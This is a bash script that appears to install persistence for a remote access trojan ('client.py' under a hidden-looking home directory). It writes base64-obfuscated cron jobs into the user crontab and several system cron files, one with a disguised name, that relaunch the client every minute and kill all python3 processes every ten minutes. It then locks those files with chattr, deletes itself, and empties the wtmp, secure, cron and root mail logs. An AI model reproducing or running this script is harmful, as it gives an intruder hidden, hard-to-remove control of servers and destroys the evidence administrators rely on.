#!/bin/bash
PWD=$(pwd)
RATPWD="/home/.trhacknon/src"
RUNNER=$(echo "python3 $RATPWD/client.py" | base64) 
KILLER=$(echo "pkill -9 -f python3" | base64)

chattr -i -a "/etc/cron.d/root" "/etc/cron.d/apache" "/var/spool/cron/root" "/var/spool/cron/crontabs/root" "/etc/cron.hourly/oanacroner1"
chattr -ia "$RATPWD/*"
(crontab -l 2>/dev/null || true; echo "*/1 * * * *  echo $RUNNER | base64 -d | bash") | crontab -
(crontab -l 2>/dev/null || true; echo "*/10 * * * * echo $KILLER | base64 -d | bash") | crontab -
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/etc/cron.d/root"
echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/etc/cron.d/root"
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/etc/cron.d/apache"
echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/etc/cron.d/apache"
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/etc/cron.d/nginx"
echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/etc/cron.d/nginx"
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/var/spool/cron/root"
echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/var/spool/cron/root"
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/var/spool/cron/crontabs/root"
echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/var/spool/cron/crontabs/root"
echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > "/etc/cron.hourly/oanacroner1"
echo -e  "*/10 * * * * echo $KILLER | base64 -d | bash" >> "/etc/cron.hourly/oanacroner1"

rm -rf "$PWD/cron.sh"
chattr +ai -V "/etc/cron.d/root" "/etc/cron.d/apache" "/var/spool/cron/root" "/var/spool/cron/crontabs/root" "/etc/cron.hourly/oanacroner1" 
chattr +ia "$RATPWD/*"
echo 0> "/var/spool/mail/root"
echo 0> "/var/log/wtmp"
echo 0> "/var/log/secure"
echo 0> "/var/log/cron"
